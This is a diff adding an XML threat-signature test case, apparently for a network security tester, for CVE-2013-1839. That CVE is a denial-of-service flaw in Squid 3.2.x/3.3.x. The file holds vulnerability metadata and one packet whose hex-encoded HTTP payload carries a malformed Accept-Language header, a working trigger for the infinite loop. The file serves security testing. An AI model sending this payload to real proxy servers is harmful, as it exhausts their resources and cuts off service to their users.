@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Squid strHdrAcptLangGetItem Value Denial of Service IPv6 version"/>
+    <EngDesc display="true" value="A denial-of-service vulnerability exists in Squid proxy server. The vulnerability is due to an error when generating an error page. This causes an infinite loop. A remote attacker can exploit this vulnerability by sending a specially crafted HTTP request to a vulnerable server (that is displaying an error page). Authentication may or may not be required depending on the server's configuration. Successful exploitation will cause an infinite loop, which may result in a resource exhaustion denial of service. Tester should set variable $destPort 3128 before test."/>
+    <Intent display="true">
+      <item value="INFINITE_LOOP"/>
+    </Intent>
+    <Protocol display="true" value="HTTP.IPV6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Squid_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Squid"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="3.2.x__prior_to_3.2.9/3.3.x__prior_to_3.3.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20130308-04"/>
+    <CVEID display="true" value="CVE-2013-1839"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="90910"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="32c92d2a0b1561e2cf55fd892cfdf6e0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635475010354602379"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961039" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="B"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:03:31" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="40628" destPort="$destPort" SeqNumber="A44A555E" AckNumber="D1701104" HeaderLength="08" WindowSize="002E" Checksum="8A2A" UrgentPointer="0000" Options="0101080A71C724D71E0B31F2" Payload="47455420687474703A2F2F4141412E4141412F20485454502F312E310D0A486F73743A204141412E4141410D0A4163636570742D4C616E67756167653A202C0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
